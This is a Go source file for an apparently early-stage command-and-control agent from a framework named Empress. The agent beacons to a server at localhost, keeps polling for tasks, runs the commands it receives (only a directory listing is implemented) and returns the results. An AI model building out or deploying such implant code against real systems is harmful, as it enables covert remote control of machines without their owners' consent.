package main

import (
	"fmt"
	"bytes"
	"encoding/json"
	"github.com/pygrum/Empress/commands"
	"net/http"
	"time"
)

var AgentID string

const maxDuration time.Duration = 1<<63 - 1

func main() {
	syn := &commands.Response{
		AgentID: AgentID,
	}
	b, _ := json.Marshal(syn)
	req, err := http.NewRequest("GET", "http://localhost:8000", bytes.NewReader(b))
	if err != nil {
		panic(err)
	}

	client := &http.Client{
		Timeout: maxDuration,
	}
	var firstReq *http.Response
	for {
		firstReq, err = client.Do(req)
		if err == nil {
			break
		}
	}
	// add cookies after first authentcation
	for {
		for _, c := range firstReq.Cookies() {
			req.AddCookie(c)
		}
		fmt.Println(req.Cookies())
		reqObj := &commands.Request{}
		resObj := &commands.Response{}
		respReq, err := client.Do(req)
		if err != nil {
			continue
		}
		if err := json.NewDecoder(respReq.Body).Decode(reqObj); err != nil {
			continue
		}
		resObj.AgentID = reqObj.AgentID
		resObj.RequestID = reqObj.RequestID
		switch reqObj.Opcode {
		case 0x1:
			fmt.Println("running ls")
			commands.CmdLS(reqObj, resObj)
		default:
			resObj.Status = 0
		}
		b, _ = json.Marshal(resObj)
		req, err = http.NewRequest("GET", "http://localhost:8000", bytes.NewReader(b))
		if err != nil {
			panic(err)
		}
		
		continue // now request is a new object, we send it as a response on the next iteration
	}
}
